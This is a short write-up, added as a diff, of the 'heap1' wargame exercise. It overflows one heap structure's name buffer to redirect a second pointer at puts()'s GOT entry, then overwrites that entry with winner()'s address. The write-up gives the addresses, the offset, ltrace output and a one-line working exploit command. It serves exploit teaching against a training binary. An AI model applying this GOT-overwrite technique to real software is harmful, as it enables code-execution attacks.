@@ -1,0 +1,34 @@
+the basic idea is first overflow what i1->name point and override i2->name thus makes i2->name point to somewhere else, and then modify where is->name currently points with a specific value.
+
+and here we let i2->name point to puts()'s entry in GOT table(in this problem, main actually calls puts() instead of printf()), and then modify puts()'s entry in GOT table to let point to winner()'s address.
+
+so we need to know the following values:
+     1,winner()'s address, just use GDB,and we get 0x80484cb;
+     2,puts()'s entry in GOT table, just use objdump, and we get 0x0804a01c;
+     3,offset between where i1->name points and where i2->name resides,
+       we can use GDB or ltrace and we get 20;
+
+thus we can construct the exploit easily:
+     ./heap1 `python -c "print 'A'*20+'\x1c\xa0\x04\x08'"`  `python -c "print '\xcb\x84\x04\x08'"`
+
+ 
+additonally, the following is the resutl of ltace:
+$ ltrace ./heap1 aaaa bbbb
+__libc_start_main(0x80484f2, 3, 0xffffd104, 0x80485c0 <unfinished ...>
+malloc(8)                                        = 0x804b008
+malloc(8)                                        = 0x804b018
+malloc(8)                                        = 0x804b028
+malloc(8)                                        = 0x804b038
+strcpy(0x804b018, "aaaa")                        = 0x804b018
+strcpy(0x804b038, "bbbb")                        = 0x804b038
+puts("and that's a wrap folks!"and that's a wrap folks!
+)                 = 25
++++ exited (status 0) +++
+
+we can easily get:
+internet1 at 0x0804b008 (size 8) 
+--> internet1.priority at 0x0804b008 (size 4) --> internet1.name at 0x0804b00c (size 4) ----> memory area pointed by internet1.name at 0x0804b018 (size 8)
+ internet2 at 0x0804b028 (size 8) 
+--> internet2.priority at 0x0804b028 (size 4) --> internet2.name at 0x0804b02c (size 4) ----> memory area pointed by internet2.name at 0x0804b038 (size 8) 
+
+thus offset between where i1->name points and where i2->name resides is 0x0804b02c - 0x0804b018 = 20.
